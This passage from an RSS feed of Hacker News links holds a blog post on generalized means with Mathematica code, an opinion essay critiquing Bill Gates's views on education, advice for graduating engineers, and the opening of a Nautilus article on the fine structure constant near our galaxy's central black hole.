<p>We can continue applying $f$ to one element then $f^{-1}$ to another element as many times as we need to, until every number in the list is equal. That number that all elements are equal to…is the mean!</p>
<p>Means are just balancing acts!</p>
<p>** I am aware we haven’t specified the most&nbsp;optimized way to perform this algorithm to ensure it halts.</p>

<h2>Example</h2>
<hr>
<p>let our list be $(2,4,6)$ and our $f(a,b)=a+b$</p>
<p>then we apply the operation and its inverse to two elements respectively:</p>
<p>$(f(2,2), 4 ,f^{-1}(6,2)) = (2+2, 4 ,6-2) =&nbsp;(4,4,4)$</p>
<p>So our mean is 4.&nbsp;We just performed the&nbsp;<em>arithmetic mean</em>!</p>

<h2>What is it good for?</h2>
<hr>
<p>Well, given ANY invertible&nbsp;symmetric binary function, we can define a mean and derive its “shortcut” formula!</p>
<p>Here are the functions that define the means we usually come across:</p>
<p>arithmetic mean: $f(a,b) = a+b$<br>
geometric mean: $f(a,b) = ab$<br>
geometric mean (alternative definition): $f(a,b) = ln(a) + ln(b)$<br>
harmonic mean: $f(a,b) = 1/(1/a + 1/b)$</p>

<h2>Favoring Large or Small Numbers</h2>
<hr>
<p>Now, most of us learn that geometric mean tends to favor smaller&nbsp;numbers.</p>
<p>For example, the arithmetic mean of 1&nbsp;and 100 is $50\frac{1}{2}$. But the geometric mean of 1 and 100 is 10.</p>
<p>Knowing what we do now, can we create a mean that favors smaller numbers&nbsp;even more?</p>
<p>I don’t know if these already exist in the formal mathematics universe, ie. books or published papers. So let me know if you find a previous name for them!</p>
<p>Franken-mean: $f(a,b) = a^b b^a$</p>
<p>Franken-mean v2: $f(a,b) = a^b + b^a$</p>
<p>You might ask if we can skew our mean toward smaller numbers&nbsp;even more than our above exponential mean. We sure can. Using something called Tetration, simply put – it is iterated exponentiation. There are even operations that encompass iterated tetration and so on…these kind of operations are called&nbsp;hyperoperations. So we can make a mean skewed toward lows or highs as much as we want, and it’s beautiful isn’t it? Before different means are taught, the theory of what defines a mean should really be taught.</p>
<p>But before I forget,&nbsp;you must be saying: “Where’s my shortcut formulas?!!”</p>
<p>Okay okay.</p>

<h2>Deriving the Closed Formulas</h2>
<hr>
<p>Let’s derive the arithmetic mean first. Assume we have a list of 4 elements, ${x,y,z,t}$</p>
<p>Given the binary symmetric&nbsp;function that defines the arithmetic mean $f(a,b)=a+b$,</p>
<p>we let $g(a) = f(a,f(a,f(a,a))) = a + a + a + a = 4a$</p>
<p>Our formula for the mean of the 4 numbers in our list will be:</p>
<p>$g^{-1}(f(x,f(y,f(z,t))))$</p>
<p>We know $g(a) = 4a$, so $g^{-1}(a) = a/4$</p>
<p>That means our mean is $(x+y+z+t)/4$, which is what we expected from the arithmetic mean</p>
<p>Above was just a demonstration for a fixed size list of 4 elements. The concept is the same for any sized list. We can use induction to extrapolate what the formula will be for a list of n&nbsp;elements, $(x+y+z+t…….+w)/n$</p>

<h2>Mathematica code for the generalized mean</h2>
<hr>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
InverseFunction[
(Fold[f, ConstantArray[#, Length[l]]]) &amp;
] [Fold[f, l]]
);
</code></pre>
<ul>
<li>Arithmetic Mean
<pre id=""><code>In:= GeneralizedMean[{x,y,z,t},(#+#2)&amp;]
Out= 1/4 (t+x+y+z)</code></pre>
</li>
<li>Geometric Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (#*#2) &amp;]
Out= (t x y z)^(1/4)
</code></pre>
</li>
<li>Harmonic Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (1/(1/# + 1/#2)) &amp;]
Out= 4/(1/t + 1/x + 1/y + 1/z)
</code></pre>
</li>
<li>Franken Mean v1
<pre id=""><code>In:= GeneralizedMean[{x, y}, (#^#2 * #2^#) &amp;]
Out= Log[x^y y^x]/(2 ProductLog[1/2 Log[x^y y^x]])
</code></pre>
</li>
</ul>
<p>I had to use 2 variables for the above, because Mathematica’s symbolic inverses aren’t strong enough.<br>
Franken Mean v2 does not even compute with symbolics or even numbers.<br>
I will eventually work on this to hopefully get at least numerics to work nomatter what.</p>
<h2>Alternative Implementation</h2>
<hr>
<p>This is an alternative implementation which seems to yield better results in some cases:</p>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
Module[{x},
Solve[Fold[f, l] == Fold[f, ConstantArray[x, Length[l]]], x][[-1,
1, 2]]
]);
</code></pre>

<h2>Create your own means!</h2>
<hr>
<p>Enjoy creating your own means! Number theoretic means on lists of primes and that sort of stuff should be very interesting to explore, cheers!</p>
<h3><strong>Continued in:</strong></h3>

<h3><a href="https://churchofthought.org/means-of-infinite-sets-and-more/"><strong>Part Two: Means of Infinite Sets</strong></a></h3>
<p><em>P.S.</em></p>
<p>Kolmogorov actually did something similar and came up with what’s called the <a href="https://en.wikipedia.org/wiki/Quasi-arithmetic_mean">Generalized f-mean</a></p>
<p>But he restricted his construct to only functions of the form $f(a,b) = g(a) + g(b)$, where g is the function that determines the mean and is to be specified.</p>


		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://churchofthought.org/blog/2017/03/26/the-generalized-mean-an-algorithmic-approach/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25236328</guid>
            <pubDate>Sat, 28 Nov 2020 08:51:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Made my personal site into a desktop environment influenced by Windows and macOS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25235800">thread link</a>) | @DustinBrett
<br/>
November 27, 2020 | https://dustinbrett.github.io/x/ | <a href="https://web.archive.org/web/*/https://dustinbrett.github.io/x/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dustinbrett.github.io/x/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25235800</guid>
            <pubDate>Sat, 28 Nov 2020 06:45:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bill Gates is wrong about education]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 64 (<a href="https://news.ycombinator.com/item?id=25235672">thread link</a>) | @rajlego
<br/>
November 27, 2020 | https://supermemo.guru/wiki/Bill_Gates_is_wrong_about_education | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Bill_Gates_is_wrong_about_education">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This text is part of: "<i><a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">I would never send my kids to school</a></i>" by <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2017)</small>
</p>


<h2><span id="Bill_Gates_is_my_hero">Bill Gates is my hero</span></h2>
<p>Bill Gates was an early guiding light and <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">our</a> inspiration. When <a href="https://supermemo.guru/wiki/Krzysztof_Biedalak" title="Krzysztof Biedalak">Krzysztof Biedalak</a> and I made our first $3 investment in a corporate rubber stamp, which was a post-communist obligation for all companies in Poland in 1991, Microsoft was a multibillion-dollar company. How could we not have been blinded by inspiration? We wanted to write a universally useful piece of software and the world would be ours - we thought. Bill Gates's software philosophy, based on respect for backward compatibility, sheltered <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> on its path to its painfully slow adoption. Software and database compatibility have been preserved for 30 years now. My first pieces of knowledge in medical sciences, typed in on Dec 13, 1987, are still there in my collection, well-memorized and useful. Without Gates and his stance on compatibility, I would have lost all that knowledge to some upgrade hiccup long ago. When Gates moved to philanthropy, he has secured his place on my list of the greatest people who ever walked this planet. Perhaps as many as <a href="https://supermemo.guru/wiki/Bill_Gates_saved_over_100_million_children" title="Bill Gates saved over 100 million children">30-120 million kids have been saved by Bill's foundation</a>. This begs a vital question: Why is Gates so awfully wrong about education? Why does he fall for the same old myth that <a href="https://supermemo.guru/wiki/Myth:_You_can_improve_education_by_throwing_more_money_in_it" title="Myth: You can improve education by throwing more money in it">investing in education will produce better outcomes</a>? The education system is wrong and it must be redesigned. <a href="https://supermemo.guru/wiki/Compulsory_schooling_must_end" title="Compulsory schooling must end">Compulsory schooling must end</a>. See: <a href="https://supermemo.guru/wiki/Grand_Education_Reform" title="Grand Education Reform">Grand Education Reform</a>
</p>
<h2><span id="Could_Bill.27s_great_mind_be_wrong.3F">Could Bill's great mind be wrong?</span></h2>
<p>Everyone who disagrees with a great mind needs to pause and re-examine. Gates got sensational credentials. He sports a genius mind. He has seen more places that I could possibly ever manage to visit in Google Maps. He has spoken to more great people than I have had a chance to read about. He has visited more schools that I have seen on pictures. He started his forays into education in 1999. In contrast, I started thinking about "the system" only in 2016 when getting ready to write this <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">book</a>. This makes me into a fledgling with an immature point of view. Gates himself is a great example of a brisk student who has turned his skills and talents into a monumental achievement. His credentials are so much better than mine!
</p>
<h2><span id="Bill_Gates.27s_perspective">Bill Gates's perspective</span></h2>
<p>Could this just be that Gates's perspective is so much different than mine?
</p><p>He looks at the education system like at the operating system. Measure the performance, look for bottlenecks in the system, fix the parameter here and there, videotape a great teacher, and make others copy the method, and manufacture greatness.
</p><p>He looks at education like a philanthropic job. Like he treats health problems with mass vaccinations, he looks for a simple formula which could improve the education of the masses with some industrial move? He seems less focused on letting the brightest thrive, and more focused on preventing the weakest from dropping out. He wants to bring up the average using some <a href="https://supermemo.guru/wiki/Testing" title="Testing">standardized testing</a> approach.
</p><p>He looks at education like a big company that needs to be managed effectively with departments, and sub-departments. With a clear division of responsibility. <a href="https://supermemo.guru/wiki/Modern_schooling_is_like_Soviet_economy#Schooling_is_like_Soviet_Economy" title="Modern schooling is like Soviet economy">With an industrial goal in mind?</a>
</p><p>Could this be that this great capitalist shows more socialist thinking than a little well-indoctrinated ex-communist like myself?
</p><p>There is a different perspective of an employer and an employee, esp. in a creative position. Gates looks at the number of college graduates. I look for specific skills and creative powers. Actual degrees do not matter much if you take time to get into a particular brain.
</p><p>He looks at students like productive workers. The heretic idea of a longer school day must have come from the factory model thinking. Longer days, more production, more manufacturing.
</p><p>He looks at education from a societal point of view, while I look at the brain of an individual. He wants to move the masses to high achievement, while I want to produce more little Bill Gateses.
</p><p>Unlike myself, Bill Gates does not focus on having more Bill Gateses. He focuses on helping the poor, in boosting qualifications of the middle class, and adds "<i>you can't run a society on top 5%</i>". He is right, however, that top 5% can forge a path in education that would inspire all the rest. They cannot be run through a compulsory system set on pushing through the remaining 95%.
</p><p>Gates's approach would be great for some poorer countries (e.g. in Africa). Where there are no schools, industrial approach and good management could quickly improve health, eliminate poverty, and provide basic education.
</p><p>My approach is probably more suited to well-developed nations where the industrial approach makes people sick of schooling. With social awareness and education on the rise, we look for more little future Noble Prize winners and future Bill Gateses.
</p><p>His own kids get the best kind of learning. During his trips around the world, they get to visit places like the Large Hadron Collider at CERN. This could spark a life-long passion that could turn them into future particle physicists or another incarnation of <a href="https://supermemo.guru/wiki/Tim_Berners-Lee" title="Tim Berners-Lee">Tim Berners-Lee</a>.  
</p><p>Where Gates optimizes for improving the average, I am looking for the optimum of peak intellectual performance.
</p><p>Last but not least, could Gates's approach be an afterglow of his dropping out from Harvard. I see that over and over again, dropouts seem to suffer from this life-long hangover about what could have been? They tend to over-appreciate the power of schooling or the power of college. In the same way, I might be under-appreciating my own degrees. Gates is <a href="https://supermemo.guru/wiki/Thiel_on_competition_for_degrees" title="Thiel on competition for degrees">the opposite of Peter Thiel</a> who studiously climbed the educational ladder until he stumbled to see the light. Thiel is now one of the staunchest critics of college.
</p>
<h2><span id="Bill_Gates.27s_formula_for_success">Bill Gates's formula for success</span></h2>
<p>I see Gates's own life as a simple formula for success in science, engineering, or life in general:
</p>
<ul><li> healthy childhood of few concerns (preferably without the relegation to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>)</li>
<li> healthy approach to schooling with pranks, rebellions, disobedience, and freedom </li>
<li> minor trajectory nudges within the <a href="https://supermemo.guru/wiki/Push_zone" title="Push zone">push zone</a> by inspirational tutors. If tutors are not parents, this might be the most expensive part of the formula</li>
<li> breakthrough passion, e.g. for tinkering with computers or software</li>
<li> healthy education, possibly interrupted by some breakthrough decision (e.g. <i>Let me drop out from Harvard to set up the greatest software company in the world</i>)</li>
<li> relentless lifelong pursuit of goals born from that <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">youthful passion</a></li>
<li> voracious reading (see: <a href="https://supermemo.guru/wiki/Bill_Gates_and_his_non-incremental_reading" title="Bill Gates and his non-incremental reading">Bill Gates and his non-incremental reading</a>)</li></ul>
<p>Only Bill Gates truly knows it, but my understanding of his life story is that his future was determined by just one major factor: getting his hands on a computer. He was good at math and programming. So are dozens of kids in my neighborhood. My thinking comes from the fact that I was also strongly affected by my first contact with computers.
</p>

<p>When <a href="https://supermemo.guru/wiki/First_steps_of_SuperMemo" title="First steps of SuperMemo">I got my first computer in 1986</a>, ZX Spectrum, I was 24 and experienced wild elation with computer's obedience in executing my commands. I told the computer what to do, and it did it perfectly without asking questions. That was wonderful. I started writing my <a href="https://supermemo.guru/wiki/Plan" title="Plan">program for planning my day</a> on paper long before I got the computer on my desk. I was eager to see it work! As ZX Spectrum would load programs from a cassette tape, I could not easily dream of having <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>. It needed access to some disk drive. I got my first PC with a 360 KB <a href="https://en.wikipedia.org/wiki/Floppy_disk">floppy disk</a> drive only <a href="https://supermemo.guru/wiki/SuperMemo_1.0_for_DOS_(1987)" title="SuperMemo 1.0 for DOS (1987)">in 1987</a></p>
<p>The above hypothetical formula for educational success is simple and effective. Only a few might ever dream to replicate the scope of Bill's success. If that formula does not bring serial Nobel Prize winners, it should at least bring up a great deal of happy and fulfilled individuals. Freedom to explore the world is essential and it is denied to a great deal of kids in the modern world. When Peter Thiel pays kids to drop out from college, he looks for this type of free thinking experience that can change one life and then can change the world.
</p>
<h2><span id="My_attempt_at_employing_Gates.27s_formula">My attempt at employing Gates's formula</span></h2>

<p>I am happy with <a href="https://supermemo.guru/wiki/Exponential_adoption_of_spaced_repetition" title="Exponential adoption of spaced repetition">my achievements in life</a>. I have followed the formula employed by Gates. However, there were some exceptions. Perhaps I could use them as an excuse for not being as wildly successful as Bill? I was sent to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>, and I am sure this slowed down my development. The time I spent with my brother was more intellectual and inspirational by two orders of magnitude. However, he was a student and could not babysit the little me for ever. In later years, I was forced into a degree of conformity by an ever-present threat of being enlisted by the army in service of the Warsaw Pact. In 1986, I was finally free of the army service, and could finally drop out, however, I was not ready. There was no market economics culture in Poland of the 1980s. I read about entrepreneurial science in Science in 1989 (Oct 31, 1989). This was the first time when it occurred to me that my research into memory might actually be a seed of a business. Initially, though, my passions led me in the direction of a PhD. Schooling told me that science done by entrepreneurs is inferior to science done in academia. I thought of <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> as an opportunity to earn money for a trip to America. It seems that while Gates was fast to mature as a little entrepreneur, I needed 28 long years to even start thinking of my <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">own business</a>.</p>
<h2><span id="Reconciling_Gates_and_Woz">Reconciling Gates and Woz</span></h2>
<p>Gates wants better teachers, better education, verification, <a href="https://supermemo.guru/wiki/Testing" title="Testing">testing</a>, measuring, carrot-and-stick for teachers, etc. In contrast, I stand with Steve Jobs. Jobs told the kids to <a href="https://supermemo.guru/wiki/Fundamental_law_of_learning" title="Fundamental law of learning">rebel</a>!
</p><p>Gates believes that the key to the <a href="https://supermemo.guru/wiki/Reform" title="Reform">great future education system</a> is the teacher. He is almost right. If we could populate present schools with great teachers, I wouldn't ever need to write <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">this book</a>. The problem is that <a href="https://supermemo.guru/wiki/Progressive_education" title="Progressive education">a great teacher is simply a truly great man</a>. Great teaching requires a degree of genius. We need millions of those great people. How can we possibly hope to produce hundreds of thousands …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://supermemo.guru/wiki/Bill_Gates_is_wrong_about_education">https://supermemo.guru/wiki/Bill_Gates_is_wrong_about_education</a></em></p>]]>
            </description>
            <link>https://supermemo.guru/wiki/Bill_Gates_is_wrong_about_education</link>
            <guid isPermaLink="false">hacker-news-small-sites-25235672</guid>
            <pubDate>Sat, 28 Nov 2020 06:12:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Considerations Before Graduating as an Engineer]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25235665">thread link</a>) | @Ninroot
<br/>
November 27, 2020 | https://reflexio.debec.eu/considerations-before-graduating-engineer | <a href="https://web.archive.org/web/*/https://reflexio.debec.eu/considerations-before-graduating-engineer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
        <figure>
            <img alt="cover" src="https://reflexio.debec.eu/assets/piano.svg">
            <figcaption><a href="https://www.pinterest.de/pin/521995413033512913/" target="_blank">credit</a></figcaption>
            
        </figure>
        
        <p>In 2018, I graduated from <a href="https://en.wikipedia.org/wiki/%C3%89cole_pour_l%27informatique_et_les_techniques_avanc%C3%A9es">EPITA</a>, a french engineering “Grande École” specialized in computer science. The subjects I had treated there were very technical: from the implementation of an ISO file reader to a <a href="https://www.lrde.epita.fr/~tiger/tiger.html">Tiger compiler</a>.</p>

<p>The technical focus, taught in technical programs such as my engineering school, has led me to some small surprises during my first steps in the business world. The following list outlines what I would have liked to have learned before graduation. The article is obviously influenced by computer science, which is the specialty of my school. Nevertheless, I hope that the students will find some teaching in it, whatever the technical field they are targeting.</p>



<h2 id="human-is-the-new-challenge">Human is the New Challenge</h2>

<p>Coming from a school whose implicit motto was “the more technical, the better”, I had to quickly get used to the idea that the new technicality coming out of school was primarily human. Don’t make me wrong: having technical knowledge is as necessary as expected by the business world. But if many of us have been trained to take up technical challenges, we have been much less prepared for the strangeness of human behavior.</p>

<blockquote>
  <p>Technical skills should no longer be your challenge, your challenge should now be human.</p>
</blockquote>

<p>Schopenhauer said in The Art of Being Right “<em>A man may be objectively in the right, and nevertheless in the eyes of bystanders, and sometimes in his own, he may come off worst</em>” which in our case could be perfectly translated as “<em>You may be technically right and yet not be supported by others.</em>”. Sometimes engaging technical decisions are taken on the basis of very non-technical arguments, for example:</p>
<ul>
  <li>you were sick on the day of an important meeting;</li>
  <li>your level in English is not good enough to argue well enough;</li>
  <li>your manager used to work at XYZ, therefore XYZ technology is chosen for the project;</li>
  <li>your ambition to change a design frightens the rest of the team, despite the little amount effort it actually requires;</li>
  <li>your colleague X doesn’t like you, therefore it doesn’t like your design;</li>
  <li>etc.</li>
</ul>

<p>The list is endless. Just keep in mind that if you want technical decisions to be accepted, you will have to arm yourself with skills that go well beyond technique, starting with <em>negotiation</em> for example.</p>



<p>The school doesn’t just train engineers in languages or tools, it establishes a culture and a discipline that becomes stronger or weaker by joining a firm. Depending on the business sector, company, project or team, not everyone gives the same attention to software engineering. It is very unlikely that this discipline is the core business of your company, nor even the academic background of your colleagues. The good practices, taken for granted, can then be violently disrupted: no code review, no unit tests, sometimes even no version-control tool.</p>

<p>The intuitive reflex of a young engineer is to bring a purely technical solution: no version-control tool? let’s install git! No code review? Let’s protect the master branch! No unit tests? Install the right testing library! Etc. But here we are, the problem is <em>not</em> technical, the problem is primarily human, more particularly cultural. Changing the corporate culture, or more modestly, <em>the culture of a team is far more difficult to change than any tool</em>.</p>

<p>I will always remember the long struggle to get GitLab for an old project. This was the kind of indispensable work tool for a software engineer. The battle was long, not because the tool did not exist (it just had to be downloaded and installed) but because the required culture was not ready.</p>

<p>It takes time and effort to change a culture, but it is well worth the effort. A tool can always be dropped, a <code>git push</code> can always be forced, but a disciplined team is hardly swindled. So when choosing between a very well equipped team and a very disciplined team, <em>choose discipline without hesitation</em>!</p>

<h2 id="professional--genius">Professional &gt; Genius</h2>

<p>In university, a lot of credit was given to geniuses who, alone, could compile a few thousand lines of complicated code in a single night’s work. When I entered the business world, my vision changed a lot from that kind of profile, capable of doing a lot of work in record time. Their confidence (or arrogance) leads to an extra commitment, which makes it difficult to meet delivery deadlines. And because geniuses understand complex things, they <a href="https://reflexio.debec.eu/principles-for-better-design#keep-it-simple-stupid">design complex systems</a> that no one understands. Their loneliness makes them unique masters of their subjects, thereby nurturing their self-esteem. Knowledge remains in their heads and their presence becomes necessary for every decision.</p>

<p><a href="https://armament.solutions/tactics/single-points-of-failure.html"><img src="https://reflexio.debec.eu/assets/single_point_of_failure.svg" alt="Single point of failure"></a></p>

<p>But geniuses also have 24-hour days and quickly turn out to be the <em>bottleneck</em> of everything, slowing down everyone else. You don’t need to be a software architecture expert to agree that it is not desirable to over-commit and underestimate a single resource: apart from the inability to scale, the resource is the single point of failure. <a href="https://en.wikipedia.org/wiki/Single_point_of_failure">The design of a single point of failure is unforgivable</a>. Once the engineer gets sick, goes on vacation, or leaves the company, the entire team will have to pay back months or even years of unprofessionalism.</p>

<p>It is a black and exaggerated portrait that I paint here. I can nevertheless bet that you will encounter this kind of profile in your career which, in addition to having a negative impact on entire projects (and on people’s health), will sometimes be claimed as a hero by the organization. <em>Real geniuses are the geniuses also capable of <a href="https://reflexio.debec.eu/principles-for-better-design#keep-it-simple-stupid">designing simplicity</a>, taking people on board while humble towards humanity and their workload</em>. These are called great professionals. They spread knowledge and responsibility in order to become not the single point of failure or the bottle neck.</p>

<blockquote>
  <p>Geniuses build scalable services, professionals are scalable geniuses. - <a href="https://twitter.com/arnaud_debec/status/1327584444849524736">Twitter</a></p>
</blockquote>

<!--
## Read Through What Is Ask From You

If you asked your manager if you had to do unit tests, he would tell you not to waste time with it.

> If I had asked people what they wanted, they would have said faster horses. - [Henry Ford](https://hbr.org/2011/08/henry-ford-never-said-the-fast)

 -->

<h2 id="side-note">Side note</h2>

<p>Do you think there’s a principle missing? Send me your comments! This list will certainly be extended and refined, subscribe to the <a data-formkit-toggle="78a863d4eb" href="https://reflexio-debec.ck.page/78a863d4eb">newsletter</a> if you wish to be notified about it.</p>

    </div></div>]]>
            </description>
            <link>https://reflexio.debec.eu/considerations-before-graduating-engineer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25235665</guid>
            <pubDate>Sat, 28 Nov 2020 06:09:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Supermassive Lens on the Constants of Nature]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25235211">thread link</a>) | @CapitalistCartr
<br/>
November 27, 2020 | http://m.nautil.us/issue/93/forerunners/a-supermassive-lens-on-the-constants-of-nature | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/93/forerunners/a-supermassive-lens-on-the-constants-of-nature">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>T</span>he 2020 Nobel Prize in Physics went to three researchers who confirmed that Einstein’s general relativity predicts black holes, and established that the center of our own galaxy houses a supermassive black hole with the equivalent of 4 million suns packed into a relatively small space. Besides expanding our understanding of black holes, the strong gravitational field around the supermassive black hole is a lab to study nature under extreme conditions. Researchers, including one of the new Nobel Laureates, <a href="http://alliance.nautil.us/article/199/opening-a-new-window-into-the-universe" target="_blank">Andrea Ghez</a> at UCLA, have measured how the intense gravity changes the fine structure constant, one of the constants of nature that defines the physical universe, and in this case, life within it. This research extends other ongoing efforts to understand the constants and whether they vary in space and time.&nbsp;The hope is to find clues to resolve issues in the Standard Model of elementary particles and in current cosmology.</p><figure data-alt="Perkowitz_BREAKER-1"><img src="http://static.nautil.us/17968_916cbd6f20415c2214d441deaefedf75.png" width="733" alt=""><figcaption><span><strong>NOBEL LAUREATE:</strong> Andrea Ghez won science’s biggest prize for her co-discovery of a supermassive black hole in the center of our galaxy. She has also precisely defined the elliptical paths of stars orbiting the galactic center.</span><span>Wikimedia Commons</span></figcaption></figure> <p>Besides Ghez, the other Nobel Laureates honored in 2020 are Roger Penrose at Cambridge University, who deepened our theoretical understanding of black holes; and Reinhard Genzel, of the Max Planck Institute for Extraterrestrial Physics in Garching, Germany. Ghez and Genzel carried out parallel but separate observations and analysis that led each to deduce the presence of our galactic supermassive black hole. At 27,000 light-years away, obtaining good data required huge telescopes. Ghez worked with the Keck Observatory on Mauna Kea in Hawaii, and Genzel used the Very Large Telescope in Chile. Each researcher found that the motion of the stars they observed arose from an enormous mass at the center of the galaxy. They obtained the same value, 4 million times the mass of our sun, in a region only as big as our solar system—definitive evidence of a supermassive black hole.</p><p>Ghez’s research at Keck made her a co-author <a href="https://arxiv.org/abs/2002.11567" target="_blank">in a paper</a> published this year, in which Aurélien Hees of the Paris Observatory and 13 international colleagues presented results for the fine structure constant near our galactic supermassive black hole. Remarkably, Ghez’s Nobel Prize-winning results supporting this research combined today’s theories and astronomical techniques with ideas dating back to Johannes Kepler and Isaac Newton to examine the motion of stars near the supermassive black hole. This is another example of Newton’s insight about how science advances when he wrote in 1675, “If I have seen further it is by standing on the shoulders of giants.”</p><blockquote><p>The constant in the strong gravity near the black hole could be a clue to modifying the Standard Model.</p> </blockquote><p>German astronomer Kepler is one such giant who changed science when he presented his laws of planetary motion in 1609. He was the first to show that the planets do not orbit the sun in divinely inspired perfect circles, as had been assumed. The orbits are ellipses with the sun at a focus of the ellipse, one of the two points symmetrically offset from the center that define how to construct an ellipse. Kepler also found a mathematical relation between the size of a planetary orbit and how long it takes the planet to complete a circuit.<br></p><p>In 1687 Newton gave Kepler’s laws a deeper, more coherent physical basis. Newton’s law of gravitation, based on mutual attraction between bodies, showed that a celestial object in a closed orbit around a mass follows an elliptical path that depends on that mass. This result, which today is taught in introductory astronomy, is the heart of how Ghez found the mass of the supermassive black hole. Her years of careful observations precisely defined the elliptical paths of stars orbiting the galactic center; then she used Newton’s theory to calculate the mass at the center (general relativity, which replaces Newton’s law, predicts black holes but Newton’s approach is sufficiently accurate for the stellar orbits around the supermassive black hole). Knowledge of these orbits would be crucial for measuring the fine structure constant in the strong gravity near the supermassive black hole. How that constant depends on gravity could be a clue to modifying the Standard Model or general relativity to deal with dark matter and dark energy, the two great puzzles of contemporary physics.</p> <p><span>T</span>his particular examination fits into a bigger, long-term examination of the fundamental constants of nature, each of which tells us something about the scope or scale of our deepest theories. Along with other constants, the fine structure constant (denoted by the Greek letter α), appears in the Standard Model, the quantum field theory of elementary particles. The numerical value of α defines how strongly photons and electrically charged particles interact through the electromagnetic force, which controls the universe along with gravity and the strong and weak nuclear forces. Among its effects, electromagnetism determines the degree of repulsion between protons and how electrons behave in an atom. If the value of α were much different from the one we know, that would affect whether nuclear fusion within stars produces the element carbon or whether atoms can form stable complex molecules. Both are necessary for life, another reason α is significant.</p><p>Other constants represent other major physical theories: <i>c</i>, the speed of light in vacuum, is crucial in relativity; <i>h</i>, the constant derived by Max Planck (now taken as “h-bar,” or <i>ħ</i> = <i>h</i>/2<i>π</i>), sets the tiny size of quantum effects; and <i>G</i>, the gravitational constant in Newton’s theory and general relativity, determines how astronomical bodies interact. In 1899 Planck used just these three to define a universal measurement system based on natural properties and not on any human artifacts. This system, he wrote, would be the same “for all times and all civilizations, extraterrestrial and non-human ones.”</p><blockquote><p>It raises the notion that out of many multiverses, the one where we exist is the one with the winning value.</p> </blockquote><p>Planck derived natural units of length, time, and mass from <i>c</i>, <i>ħ</i>, and <i>G</i>: <i>L<sub>P</sub></i> = 1.6 x 10<sup>-35</sup> meters, <i>T<sub>P</sub></i> = 5.4 x 10<sup>-44</sup> seconds, and <i>M<sub>P</sub></i> = 2.2 x 10<sup>-8</sup> kilograms. Too small to be practical, they have conceptual weight. In today’s universe the gravitational interaction between elementary particles is too weak to affect their quantum behavior. But place the bodies a tiny Planck length <i>L<sub>P</sub></i> apart, less than the diameter of an elementary particle, and their gravitational interaction becomes strong enough to rival quantum effects. This defines the “Planck era” 10<sup>-44</sup> seconds after the Big Bang, when gravitational and quantum effects were of similar strength and would require a combined theory of quantum gravity instead of the two separate theories we have today.<br></p><p>Nevertheless, to some physicists, <i>c</i>, <i>ħ</i>, and <i>G</i> are not truly fundamental because they depend on units of measurement. Consider for instance that <i>c</i> is 299,792 km/sec in metric units but 186,282 miles/sec in English units, This shows that physical units are cultural constructs rather than inherent in nature (in 1999, NASA’s Mars Climate Orbiter fatally crashed because two scientific teams forgot to check which measurement system the other had used). Constants that are pure numbers, however, would translate perfectly between cultures and even between us and aliens with unimaginably different units of measurement.</p><p>The fine structure constant α stands out as carrying this favored purity. In 1916 it appeared in calculations for the wavelengths of light emitted or absorbed as the single electron in hydrogen atoms jumps between quantum levels. Niels Bohr’s early quantum theory predicted the main wavelengths but spectra showed additional features. To explain these, the German theorist Arnold Sommerfeld added relativity to the quantum theory of the hydrogen atom. His calculations depended on a quantity he called the fine structure constant. It includes <i>ħ</i>, <i>c</i>, and the charge on the electron <i>e</i>, another constant of nature; and the permittivity <i>ε</i><sub>0</sub>&nbsp; that represents the electrical properties of vacuum. Remarkably, the physical units in this odd collection cancel out, leaving only the pure number 0.0072973525693.</p> <figure data-alt="Perkowitz_BREAKER-2"><img src="http://static.nautil.us/17967_a52357f1ce8160dee6563b6a3391ffa8.png" width="733" alt=""><figcaption><span><strong>GIANT SHOULDERS:</strong> This year’s Nobel winners drew on astronomical techniques dating back to Isaac Newton, who wrote of scientific advances, “If I have seen further it is by standing on the shoulders of giants.”</span><span>Nicku / Shutterstock</span></figcaption></figure><p>Sommerfeld used α just as a parameter, but it gained fame in the late 1920s when it reappeared in advanced work on relativistic quantum 